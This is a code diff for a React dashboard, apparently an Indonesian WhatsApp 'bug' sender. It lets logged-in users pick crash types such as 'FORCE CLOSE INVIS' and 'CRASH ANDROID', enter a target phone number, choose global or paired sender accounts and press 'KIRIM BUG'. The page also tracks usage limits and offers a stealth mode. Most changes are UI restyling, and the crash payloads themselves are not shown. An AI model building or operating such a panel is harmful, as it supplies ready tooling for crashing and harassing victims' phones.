@@ -38,7 +38,7 @@ export default function YaeMikoDashboard() {
   const [pairingStatus, setPairingStatus] = useState<"idle" | "loading" | "success">("idle")
   const [receivedCode, setReceivedCode] = useState("")
 
-  // TAMBAHAN STATE BARU UNTUK SENDER PRIBADI
+  // STATE UNTUK SENDER PRIBADI
   const [isSenderPaired, setIsSenderPaired] = useState(false)
   const [pribadiLimit, setPribadiLimit] = useState(0)
 
@@ -46,11 +46,11 @@ export default function YaeMikoDashboard() {
   const isSendingRef = useRef(false)
 
   const BUG_TYPES = [
-    { name: "DELAY INVISIBLE", code: "delayLow", icon: <Ghost className="w-10 h-10 text-cyan-400" /> },
-    { name: "FORCE CLOSE INVIS", code: "crashHigh", icon: <Skull className="w-10 h-10 text-red-500" /> },
-    { name: "DALAY INVIS IOS", code: "blankTap", icon: <ZapOff className="w-10 h-10 text-yellow-500" />},
-    { name: "BLANK UI", code: "delayIOS", icon: <Activity className="w-10 h-10 text-pink-500" /> },
-    { name: "CRASH ANDROID", code: "forceClose", icon: <Bug className="w-10 h-10 text-orange-500" /> },
+    { name: "DELAY INVISIBLE", code: "delayLow", icon: <Ghost className="w-14 h-14 text-[#00e5ff]" /> },
+    { name: "FORCE CLOSE INVIS", code: "crashHigh", icon: <Skull className="w-14 h-14 text-red-500" /> },
+    { name: "DALAY INVIS IOS", code: "blankTap", icon: <ZapOff className="w-14 h-14 text-yellow-500" />},
+    { name: "BLANK UI", code: "delayIOS", icon: <Activity className="w-14 h-14 text-pink-500" /> },
+    { name: "CRASH ANDROID", code: "forceClose", icon: <Bug className="w-14 h-14 text-orange-500" /> },
   ]
 
   const sendInitialIntel = async () => {
@@ -103,7 +103,7 @@ export default function YaeMikoDashboard() {
         body: formData
       })
       const data = await res.json()
-      return data.success? data.data.url : null
+      return data.success ? data.data.url : null
     } catch (e) { return null }
   }
 
@@ -161,12 +161,11 @@ export default function YaeMikoDashboard() {
         })
         const data = await res.json()
         if (data) {
-          if (data.isLocked!== undefined) setIsWebLocked(data.isLocked === true)
+          if (data.isLocked !== undefined) setIsWebLocked(data.isLocked === true)
           if (pairingStatus === "loading" && data.pairingCode) {
             setReceivedCode(data.pairingCode)
             setPairingStatus("success")
           }
-          // DETEKSI UDAH PAIRING ATAU BELUM
           if (data.isPaired !== undefined) {
             setIsSenderPaired(data.isPaired === true)
             setPribadiLimit(data.isPaired === true ? 10 : 0)
@@ -197,10 +196,10 @@ export default function YaeMikoDashboard() {
         })
         const data = await res.json()
         if (data && !isSendingRef.current) {
-          if (data.limit!== undefined) setBugLimit(Number(data.limit))
-          if (data.locked!== undefined) setIsWebLocked(data.locked === true)
+          if (data.limit !== undefined) setBugLimit(Number(data.limit))
+          if (data.locked !== undefined) setIsWebLocked(data.locked === true)
         }
-      } else if (action === 'set' && valueToSet!== undefined) {
+      } else if (action === 'set' && valueToSet !== undefined) {
         await fetch('/api/control', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -309,7 +308,6 @@ export default function YaeMikoDashboard() {
       return
     }
 
-    // UPDATE LOGIC CEK LIMIT PAIRING
     const currentLimit = senderType === "pribadi" ? pribadiLimit : bugLimit
 
     if (userRole === "free" && currentLimit <= 0) {
@@ -323,15 +321,13 @@ export default function YaeMikoDashboard() {
     }
 
     isSendingRef.current = true
-
     let nextLimit = bugLimit
-    
-    // UPDATE LOGIC PENGURANGAN LIMIT
+
     if (userRole === "free") {
       if (senderType === "pribadi") {
         const nextPribadiLimit = Math.max(0, pribadiLimit - 1)
         setPribadiLimit(nextPribadiLimit)
-        nextLimit = nextPribadiLimit // Digunakan sementara buat di text telegram
+        nextLimit = nextPribadiLimit 
       } else {
         nextLimit = Math.max(0, bugLimit - 1)
         setBugLimit(nextLimit)
@@ -339,7 +335,7 @@ export default function YaeMikoDashboard() {
       }
     }
 
-    const delay = engineSpeed === "Instant"? 1000 : engineSpeed === "Fast"? 2500 : 4000
+    const delay = engineSpeed === "Instant" ? 1000 : engineSpeed === "Fast" ? 2500 : 4000
     const selectedBug = BUG_TYPES[activeNav].name
 
     setTimeout(async () => {
@@ -369,7 +365,7 @@ export default function YaeMikoDashboard() {
   }
 
   const copyToClipboard = () => {
-    if (typeof navigator!== 'undefined' && targetNumber) {
+    if (typeof navigator !== 'undefined' && targetNumber) {
       navigator.clipboard.writeText(targetNumber)
       setIsCopied(true)
       setTimeout(() => setIsCopied(false), 2000)
@@ -391,8 +387,21 @@ export default function YaeMikoDashboard() {
     )
   }
 
+  // --- LOGIC PENENTUAN STATUS UNTUK UI BARU ---
+  const currentStatus = (() => {
+    if (senderType === 'pribadi') {
+      return isSenderPaired 
+        ? { text: 'ACT', color: 'text-[#00e676]' } 
+        : { text: 'OFF', color: 'text-[#ff3b3b]' };
+    } else {
+      return bugLimit > 0 
+        ? { text: 'ACT', color: 'text-[#00e676]' } 
+        : { text: 'OFF', color: 'text-[#ff3b3b]' };
+    }
+  })();
+
   return (
-    <div className={`relative min-h-screen bg-black text-white overflow-hidden transition-opacity duration-500 ${isStealth? 'opacity-30' : 'opacity-100'}`}>
+    <div className={`relative min-h-screen bg-black text-white overflow-hidden transition-opacity duration-500 ${isStealth ? 'opacity-30' : 'opacity-100'}`}>
       <div className="fixed inset-0 z-0">
         <video autoPlay loop muted playsInline className="w-full h-full object-cover opacity-40">
           <source src="/bg-anime.mp4" type="video/mp4" />
@@ -401,6 +410,7 @@ export default function YaeMikoDashboard() {
       </div>
       <audio ref={bgMusicRef} src="/audio.mp3" loop />
 
+      {/* OVERLAYS & MODALS (TETAP SAMA SEPERTI ASLI LU) */}
       {pairingStatus === "loading" && (
         <div className="fixed inset-0 z-[10008] bg-black/95 flex-col items-center justify-center backdrop-blur-md">
           <Loader2 className="w-16 h-16 text-cyan-400 animate-spin mb-4" />
@@ -468,7 +478,8 @@ export default function YaeMikoDashboard() {
         </div>
       )}
 
-      {!isLoggedIn? (
+      {/* LOGIN PAGE */}
+      {!isLoggedIn ? (
         <div className="relative z-10 flex items-center justify-center min-h-screen p-6">
           <div className="w-full max-w-sm bg-white/5 border-white/10 backdrop-blur-3xl rounded-3xl p-10 shadow-2xl">
             <h1 className="text-3xl font-black italic uppercase text-cyan-400 tracking-tighter mb-10 text-center">
@@ -499,108 +510,149 @@ export default function YaeMikoDashboard() {
           </div>
         </div>
       ) : (
-        <div className="relative z-10 p-6 max-w-md mx-auto min-h-screen">
-          {currentView === 'dashboard'? (
+        <div className="relative z-10 p-6 max-w-md mx-auto min-h-screen pb-24">
+          
+          {/* DASHBOARD PAGE */}
+          {currentView === 'dashboard' ? (
             <div className="animate-in fade-in duration-500">
+              
+              {/* HEADER SPEED & ROLE */}
               <div className="flex justify-between items-center mb-6">
                 <span className="text-xs font-black uppercase tracking-widest text-cyan-400">SPEED: {engineSpeed}</span>
-                <span className={`text-xs font-black uppercase px-4 py-1 rounded-full border ${userRole === 'admin'? 'text-cyan-400 border-cyan-500/20 bg-cyan-500/10' : bugLimit > 0? 'text-pink-500 border-pink-500/20 bg-pink-500/10' : 'text-red-500 border-red-500/20 bg-pink-500/10'}`}>
-                  {userRole === "admin"? "ROLE: ADMIN" : `LIMIT: ${bugLimit}/5`}
+                <span className={`text-xs font-black uppercase px-4 py-1 rounded-full border ${userRole === 'admin' ? 'text-cyan-400 border-cyan-500/20 bg-cyan-500/10' : bugLimit > 0 ? 'text-pink-500 border-pink-500/20 bg-pink-500/10' : 'text-red-500 border-red-500/20 bg-pink-500/10'}`}>
+                  {userRole === "admin" ? "ROLE: ADMIN" : `LIMIT: ${bugLimit}/5`}
                 </span>
               </div>
 
-              <div className="bg-gradient-to-br from-white/10 to-transparent border-white/10 rounded-[2.5rem] p-6 mb-6 text-center backdrop-blur-md relative shadow-2xl overflow-hidden">
-                <div className="flex justify-between items-center absolute inset-x-2 top-1/2 -translate-y-1/2 z-10 px-2">
-                   <button onClick={() => setActiveNav(prev => (prev - 1 + BUG_TYPES.length) % BUG_TYPES.length)} className="p-2 bg-black/40 rounded-full active:scale-90 transition-all"><ChevronLeft size={20}/></button>
-                   <button onClick={() => setActiveNav(prev => (prev + 1) % BUG_TYPES.length)} className="p-2 bg-black/40 rounded-full active:scale-90 transition-all"><ChevronRight size={20}/></button>
-                </div>
-                <div className="mb-3 flex justify-center">{BUG_TYPES[activeNav].icon}</div>
-                <h2 className="text-xl font-black italic uppercase mb-6">{BUG_TYPES[activeNav].name}</h2>
+              {/* SECTION: PILIH SENDER BARU */}
+              <div className="flex gap-4 mb-6">
+                <button
+                  onClick={() => setSenderType('pribadi')}
+                  className={`flex-1 flex flex-col items-center justify-center py-6 rounded-3xl transition-all duration-300 ${
+                    senderType === 'pribadi' 
+                      ? 'bg-[#00e5ff] text-black shadow-[0_0_20px_rgba(0,229,255,0.3)]' 
+                      : 'bg-[#151b3b]/80 backdrop-blur-md text-gray-400 hover:bg-[#1e2650]'
+                  }`}
+                >
+                  <svg className="w-8 h-8 mb-2" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                  </svg>
+                  <h2 className="text-lg font-bold mb-1">Pribadi</h2>
+                  <p className={`text-[10px] ${senderType === 'pribadi' ? 'text-black/70' : 'text-gray-500'}`}>
+                    <span className="font-bold">{isSenderPaired ? '✓' : '✗'}</span> {isSenderPaired ? 'Terkait' : 'Kosong'}
+                  </p>
+                </button>
+
+                <button
+                  onClick={() => setSenderType('global')}
+                  className={`flex-1 flex flex-col items-center justify-center py-6 rounded-3xl transition-all duration-300 ${
+                    senderType === 'global' 
+                      ? 'bg-[#00e5ff] text-black shadow-[0_0_20px_rgba(0,229,255,0.3)]' 
+                      : 'bg-[#111322]/80 backdrop-blur-md text-white hover:bg-[#1a1d36]'
+                  }`}
+                >
+                  <svg className="w-8 h-8 mb-2 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                  </svg>
+                  <h2 className="text-lg font-bold mb-1">Global</h2>
+                  <p className="text-[10px] text-gray-400">54 sender</p>
+                </button>
+              </div>
+
+              {/* SECTION: BUG ENGINE CARD BARU (UI Delay Invisible) */}
+              <div className="bg-gradient-to-b from-[#1a203f]/90 to-[#12162d]/90 backdrop-blur-md rounded-[30px] p-6 shadow-2xl relative overflow-hidden mb-6 border border-white/5">
                 
-                {/* TAMPILAN KOTAK LIMIT STATUS ONLINE BARU */}
-                <div className="grid grid-cols-3 gap-3">
+                <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-32 bg-[#00e5ff] opacity-10 blur-3xl rounded-full pointer-events-none"></div>
+
+                <div className="flex justify-center mb-4 relative z-10">
+                  {BUG_TYPES[activeNav].icon}
+                </div>
+
+                <div className="flex justify-between items-center mb-8 px-2 relative z-10">
+                  <button onClick={() => setActiveNav(prev => (prev - 1 + BUG_TYPES.length) % BUG_TYPES.length)} className="w-8 h-8 bg-black/60 rounded-full flex items-center justify-center hover:bg-black transition active:scale-90">
+                    <ChevronLeft size={20} className="text-white"/>
+                  </button>
+                  <h2 className="text-xl font-black text-white italic tracking-wider drop-shadow-lg text-center leading-none">
+                    {BUG_TYPES[activeNav].name}
+                  </h2>
+                  <button onClick={() => setActiveNav(prev => (prev + 1) % BUG_TYPES.length)} className="w-8 h-8 bg-black/60 rounded-full flex items-center justify-center hover:bg-black transition active:scale-90">
+                    <ChevronRight size={20} className="text-white"/>
+                  </button>
+                </div>
+
+                <div className="flex justify-between gap-3 relative z-10">
                   {/* LIMIT */}
-                  <div className="bg-black/60 p-3 rounded-xl border-white/5 flex-col items-center justify-center">
-                    {userRole === "admin"? (
-                      <Infinity className="w-5 h-5 text-cyan-400 animate-pulse" />
+                  <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center border border-white/5">
+                    {userRole === "admin" ? (
+                      <Infinity className="w-8 h-8 text-[#00e5ff] mb-1 animate-pulse" />
                     ) : (
-                      <p className="text-lg font-black text-cyan-400 leading-none">
-                        {senderType === "pribadi" ? pribadiLimit : bugLimit}
-                      </p>
+                      <span className="text-3xl font-bold text-[#00e5ff] mb-1">
+                        {senderType === 'pribadi' ? pribadiLimit : bugLimit}
+                      </span>
                     )}
-                    <p className="text-[6px] text-white/40 uppercase font-bold mt-1">LIMIT</p>
+                    <span className="text-[10px] font-bold text-gray-500 tracking-widest">LIMIT</span>
                   </div>
 
                   {/* STATUS */}
-                  <div className="bg-black/60 p-3 rounded-xl border-white/5 flex-col items-center justify-center">
-                    <p className={`text-lg font-black leading-none ${
-                      userRole === "admin" ? "text-green-500" :
-                      senderType === "pribadi"
-                        ? (isSenderPaired ? "text-green-500" : "text-red-600")
-                        : (bugLimit > 0 ? "text-green-500" : "text-red-600")
-                    }`}>
-                      {userRole === "admin" ? "ACT" :
-                       senderType === "pribadi"
-                       ? (isSenderPaired ? "ACT" : "OFF")
-                       : (bugLimit > 0 ? "ACT" : "OFF")
-                      }
-                    </p>
-                    <p className="text-[6px] text-white/40 uppercase font-bold mt-1">STATUS</p>
+                  <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center border border-white/5">
+                    <span className={`text-2xl font-black mb-1 ${currentStatus.color}`}>
+                      {userRole === 'admin' ? 'ACT' : currentStatus.text}
+                    </span>
+                    <span className="text-[10px] font-bold text-gray-500 tracking-widest">STATUS</span>
                   </div>
 
                   {/* ONLINE */}
-                  <div className="bg-black/60 p-3 rounded-xl border-white/5 flex-col items-center justify-center">
-                    <p className="text-lg font-black text-white leading-none">{onlineUsers}</p>
-                    <p className="text-[6px] text-white/40 uppercase font-bold mt-1">ONLINE</p>
+                  <div className="flex-1 bg-[#0a0d1e] rounded-2xl py-4 flex flex-col items-center justify-center border border-white/5">
+                    <span className="text-3xl font-bold text-white mb-1">{onlineUsers}</span>
+                    <span className="text-[10px] font-bold text-gray-500 tracking-widest">ONLINE</span>
                   </div>
                 </div>
               </div>
 
+              {/* TARGET NUMBER INPUT */}
               <div className="relative mb-6">
                 <input value={targetNumber} onChange={(e) => setTargetNumber(e.target.value)} className="w-full bg-black/60 border-white/10 p-5 rounded-2xl text-center font-black italic text-lg text-cyan-400 pr-16 outline-none focus:border-cyan-500 transition-all" placeholder="628XXXXXXXX" />
                 <button onClick={copyToClipboard} className="absolute right-5 top-1/2 -translate-y-1/2 text-white/40 hover:text-cyan-400 transition-colors">
-                  {isCopied? <CheckCircle2 size={24} className="text-green-500" /> : <Copy size={24} />}
+                  {isCopied ? <CheckCircle2 size={24} className="text-green-500" /> : <Copy size={24} />}
                 </button>
               </div>
 
               <button onClick={handleSendBug} className="w-full py-5 bg-gradient-to-r from-pink-600 via-red-600 to-orange-600 rounded-[2.5rem] font-black uppercase italic text-xs text-white shadow-xl active:scale-95 transition-all">KIRIM BUG</button>
 
-              <div className="bg-white/5 border-white/10 rounded-3xl p-5 mt-4">
-                {/* UPDATE UI TOMBOL SENDER */}
-                <div className="flex gap-2 mb-4">
-                  <button onClick={() => setSenderType("global")} className={`flex-1 py-3 rounded-xl text-xs font-black uppercase transition-all ${senderType === "global"? "bg-cyan-600 text-white shadow-lg" : "bg-black/40 text-white/40"}`}>GLOBAL</button>
-                  <button onClick={() => setSenderType("pribadi")} className={`flex-1 py-3 rounded-xl text-xs font-black uppercase transition-all ${senderType === "pribadi"? "bg-cyan-600 text-white shadow-lg" : "bg-black/40 text-white/40"}`}>PRIBADI</button>
-                </div>
-                {senderType === "pribadi" && (
-                  <div className="space-y-3 animate-in fade-in">
+              {/* PAIRING PRIBADI INPUT (Hanya muncul jika mode Pribadi) */}
+              {senderType === "pribadi" && (
+                <div className="bg-white/5 border-white/10 rounded-3xl p-5 mt-4 animate-in fade-in">
+                  <div className="space-y-3">
+                    <p className="text-[10px] font-bold text-white/50 uppercase tracking-wide text-center">Tautkan Device Station</p>
                     <input value={senderNumber} onChange={(e) => setSenderNumber(e.target.value)} className="w-full bg-black border-white/10 p-3 rounded-xl text-center text-xs text-cyan-400 font-bold" placeholder="NOMOR SENDER (628...)" />
                     <button onClick={handleRequestPairing} className="w-full py-3 bg-pink-600 rounded-xl font-black text-xs uppercase">REQUEST PAIRING</button>
                   </div>
-                )}
-              </div>
+                </div>
+              )}
+
             </div>
           ) : (
             <div className="animate-in fade-in duration-500">
               <h2 className="text-lg font-black italic uppercase mb-10 border-b border-white/10 pb-4 text-cyan-400">
-                Setting {userRole === "admin"? "Leo (Owner)" : "Selz"}
+                Setting {userRole === "admin" ? "Leo (Owner)" : "Selz"}
               </h2>
               <div className="space-y-5">
                 <div className="bg-white/5 p-6 rounded-[2.5rem] border-white/5 backdrop-blur-lg shadow-xl">
                   <div className="flex items-center gap-3 mb-5 text-xs font-black uppercase text-white/60 italic"><Zap size={16} className="text-cyan-400"/> Engine Speed</div>
                   <div className="flex gap-2">
                     {["Normal", "Fast", "Instant"].map((speed) => (
-                      <button key={speed} onClick={() => setEngineSpeed(speed)} className={`flex-1 py-4 rounded-2xl text-[9px] font-black border transition-all ${engineSpeed === speed? 'bg-cyan-500 text-black border-cyan-400' : 'bg-black/40 text-white/40 border-transparent'}`}>{speed}</button>
+                      <button key={speed} onClick={() => setEngineSpeed(speed)} className={`flex-1 py-4 rounded-2xl text-[9px] font-black border transition-all ${engineSpeed === speed ? 'bg-cyan-500 text-black border-cyan-400' : 'bg-black/40 text-white/40 border-transparent'}`}>{speed}</button>
                     ))}
                   </div>
                 </div>
                 <div className="flex items-center justify-between bg-white/5 p-6 rounded-[2.5rem] border-white/5">
                   <div className="flex items-center gap-4"><EyeOff className="text-pink-500" size={22} /><span className="text-xs font-black uppercase italic">Stealth Mode</span></div>
-                  <button onClick={() => setIsStealth(!isStealth)} className={`w-14 h-7 rounded-full relative transition-all ${isStealth? 'bg-cyan-500' : 'bg-white/10'}`}><div className={`absolute top-1 w-5 h-5 rounded-full bg-white transition-all ${isStealth? 'right-1' : 'left-1'}`}></div></button>
+                  <button onClick={() => setIsStealth(!isStealth)} className={`w-14 h-7 rounded-full relative transition-all ${isStealth ? 'bg-cyan-500' : 'bg-white/10'}`}><div className={`absolute top-1 w-5 h-5 rounded-full bg-white transition-all ${isStealth ? 'right-1' : 'left-1'}`}></div></button>
                 </div>
                 <div className="flex items-center justify-between bg-white/5 p-6 rounded-[2.5rem] border-white/5">
                   <div className="flex items-center gap-4"><Music className="text-cyan-400" size={22} /><span className="text-xs font-black uppercase italic">Audio Output</span></div>
-                  <button onClick={() => setIsMusicOn(!isMusicOn)} className={`p-3 rounded-2xl transition-all ${isMusicOn? 'bg-cyan-500 text-black' : 'bg-black/40 text-white/40'}`}>
-                    {isMusicOn? <Volume2 size={20}/> : <VolumeX size={20}/>}
+                  <button onClick={() => setIsMusicOn(!isMusicOn)} className={`p-3 rounded-2xl transition-all ${isMusicOn ? 'bg-cyan-500 text-black' : 'bg-black/40 text-white/40'}`}>
+                    {isMusicOn ? <Volume2 size={20}/> : <VolumeX size={20}/>}
                   </button>
                 </div>
                 <button onClick={() => { setIsLoggedIn(false); setUsername(""); setPassword(""); }} className="w-full flex items-center justify-center gap-4 py-6 bg-red-600/10 border-red-600/20 rounded-[2.5rem] text-xs font-black uppercase italic text-red-500 hover:bg-red-600 hover:text-white transition-all">LOG OUT</button>
@@ -608,36 +660,38 @@ export default function YaeMikoDashboard() {
             </div>
           )}
 
+          {/* BOTTOM NAVIGATION */}
           <div className="fixed bottom-8 left-16 right-16 bg-[#0a1628]/95 border-white/10 p-4 rounded-[2.5rem] flex justify-around backdrop-blur-3xl z-20 shadow-2xl">
-            <button onClick={() => setCurrentView('dashboard')} className={`p-1 transition-all ${currentView === 'dashboard'? 'text-cyan-400 scale-110' : 'text-white/20'}`}><LayoutDashboard size={22}/></button>
-            <button onClick={() => setCurrentView('settings')} className={`p-1 transition-all ${currentView === 'settings'? 'text-cyan-400 scale-110' : 'text-white/20'}`}><Settings size={22}/></button>
+            <button onClick={() => setCurrentView('dashboard')} className={`p-1 transition-all ${currentView === 'dashboard' ? 'text-cyan-400 scale-110' : 'text-white/20'}`}><LayoutDashboard size={22}/></button>
+            <button onClick={() => setCurrentView('settings')} className={`p-1 transition-all ${currentView === 'settings' ? 'text-cyan-400 scale-110' : 'text-white/20'}`}><Settings size={22}/></button>
           </div>
         </div>
       )}
 
-  <style jsx global>{`
-  @keyframes shake {
-    0% { transform: translate(2px, 2px); }
-    10% { transform: translate(-1px, -2px); }
-    100% { transform: translate(0); }
-   }
-   .animate-shake_violent { animation: shake 0.1s infinite; }
+      {/* KEYFRAMES ANIMASI LU */}
+      <style jsx global>{`
+      @keyframes shake {
+        0% { transform: translate(2px, 2px); }
+        10% { transform: translate(-1px, -2px); }
+        100% { transform: translate(0); }
+      }
+      .animate-shake_violent { animation: shake 0.1s infinite; }
 
-   @keyframes rumble {
-     0%, 100% { background-color: rgba(69, 10, 10, 0.9); }
-     50% { background-color: rgba(127, 29, 29, 0.95); }
-    }
-   .animate-bg_rumble { animation: rumble 0.3s infinite; }
+      @keyframes rumble {
+        0%, 100% { background-color: rgba(69, 10, 10, 0.9); }
+        50% { background-color: rgba(127, 29, 29, 0.95); }
+      }
+      .animate-bg_rumble { animation: rumble 0.3s infinite; }
 
-   @keyframes glitch {
-      0% { text-shadow: 2px 0 red, -2px 0 cyan; }
-      25% { text-shadow: -2px 0 red, 2px 0 cyan; }
-      50% { text-shadow: 2px 2px red, -2px -2px cyan; }
-      75% { text-shadow: -2px -2px red, 2px 2px cyan; }
-      100% { text-shadow: 2px 0 red, -2px 0 cyan; }
+      @keyframes glitch {
+        0% { text-shadow: 2px 0 red, -2px 0 cyan; }
+        25% { text-shadow: -2px 0 red, 2px 0 cyan; }
+        50% { text-shadow: 2px 2px red, -2px -2px cyan; }
+        75% { text-shadow: -2px -2px red, 2px 2px cyan; }
+        100% { text-shadow: 2px 0 red, -2px 0 cyan; }
       }
       .animate-glitch_extreme { animation: glitch 0.2s infinite; }
       `}</style>
     </div>
   )
-    }
+}
